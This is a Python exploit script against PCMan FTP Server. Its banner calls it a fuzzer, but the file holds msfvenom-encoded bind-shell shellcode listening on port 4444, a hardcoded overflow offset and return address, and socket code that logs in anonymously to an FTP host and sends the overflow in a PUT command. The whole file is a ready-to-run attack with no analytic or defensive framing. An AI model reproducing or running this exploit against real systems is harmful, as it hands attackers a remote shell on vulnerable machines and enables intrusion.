#!/usr/bin/python

import socket
import sys
import struct

banner = """
#----------------------------------------------#
pcman FTP Server Exploit Fuzzer
1. python pcman_ftp_server_fuzz.py
#----------------------------------------------#
"""

print banner
#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=172.16.73.129 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f c
#shellcode = (

sc=("\xbb\x07\x8e\x2a\xeb\xd9\xe8\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x5a\x12\x03\x5a\x12\x83\xc5\x8a\xc8\x1e\x35\x7a\x8e"
"\xe1\xc5\x7b\xef\x68\x20\x4a\x2f\x0e\x21\xfd\x9f\x44\x67\xf2"
"\x54\x08\x93\x81\x19\x85\x94\x22\x97\xf3\x9b\xb3\x84\xc0\xba"
"\x37\xd7\x14\x1c\x09\x18\x69\x5d\x4e\x45\x80\x0f\x07\x01\x37"
"\xbf\x2c\x5f\x84\x34\x7e\x71\x8c\xa9\x37\x70\xbd\x7c\x43\x2b"
"\x1d\x7f\x80\x47\x14\x67\xc5\x62\xee\x1c\x3d\x18\xf1\xf4\x0f"
"\xe1\x5e\x39\xa0\x10\x9e\x7e\x07\xcb\xd5\x76\x7b\x76\xee\x4d"
"\x01\xac\x7b\x55\xa1\x27\xdb\xb1\x53\xeb\xba\x32\x5f\x40\xc8"
"\x1c\x7c\x57\x1d\x17\x78\xdc\xa0\xf7\x08\xa6\x86\xd3\x51\x7c"
"\xa6\x42\x3c\xd3\xd7\x94\x9f\x8c\x7d\xdf\x32\xd8\x0f\x82\x5a"
"\x2d\x22\x3c\x9b\x39\x35\x4f\xa9\xe6\xed\xc7\x81\x6f\x28\x10"
"\xe5\x45\x8c\x8e\x18\x66\xed\x87\xde\x32\xbd\xbf\xf7\x3a\x56"
"\x3f\xf7\xee\xf9\x6f\x57\x41\xba\xdf\x17\x31\x52\x35\x98\x6e"
"\x42\x36\x72\x07\xe9\xcd\x15\xe8\x46\xcc\xf1\x80\x94\xce\xe8"
"\x0c\x10\x28\x60\xbd\x74\xe3\x1d\x24\xdd\x7f\xbf\xa9\xcb\xfa"
"\xff\x22\xf8\xfb\x4e\xc3\x75\xef\x27\x23\xc0\x4d\xe1\x3c\xfe"
"\xf9\x6d\xae\x65\xf9\xf8\xd3\x31\xae\xad\x22\x48\x3a\x40\x1c"
"\xe2\x58\x99\xf8\xcd\xd8\x46\x39\xd3\xe1\x0b\x05\xf7\xf1\xd5"
"\x86\xb3\xa5\x89\xd0\x6d\x13\x6c\x8b\xdf\xcd\x26\x60\xb6\x99"
"\xbf\x4a\x09\xdf\xbf\x86\xff\x3f\x71\x7f\x46\x40\xbe\x17\x4e"
"\x39\xa2\x87\xb1\x90\x66\xb7\xfb\xb8\xcf\x50\xa2\x29\x52\x3d"
"\x55\x84\x91\x38\xd6\x2c\x6a\xbf\xc6\x45\x6f\xfb\x40\xb6\x1d"
"\x94\x24\xb8\xb2\x95\x6c")


offset = "A"*2007 + "\xC8\xA7\x3E\x76" + "\x90"*15 + sc
#nowjump
#bufferandshellcode
sploit = offset

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	print "\nDestroy them with lazers..."
	s.connect(('192.168.1.9',21))
	s.recv(1024)
	s.send('USER anonymous\r\n')
	s.recv(1024)
	s.send('PASS anonymous\r\n')
	s.recv(1024)
	s.send('PUT ' + sploit + '\r\n\n')
	s.recv(1024)
	s.send('QUIT\r\n')
	s.close
	print "\nFire in the hole! Go pick up the pieces!"
except:
	print "ERROR! Shutting it dooooown.."
